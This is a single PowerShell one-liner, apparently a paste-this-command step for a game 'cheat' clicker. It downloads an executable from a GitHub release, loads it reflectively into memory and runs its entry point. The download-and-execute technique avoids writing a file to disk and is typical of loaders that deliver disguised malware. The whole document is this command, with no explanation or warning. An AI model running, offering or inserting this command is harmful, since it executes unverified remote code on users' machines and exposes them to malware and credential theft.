[System.Reflection.Assembly]::Load((Invoke-WebRequest "https://github.com/loader-cheat/Hollow-Clicker-Public/releases/download/Latest/Hollow.Clicker.exe").Content).EntryPoint.Invoke($null, $null)
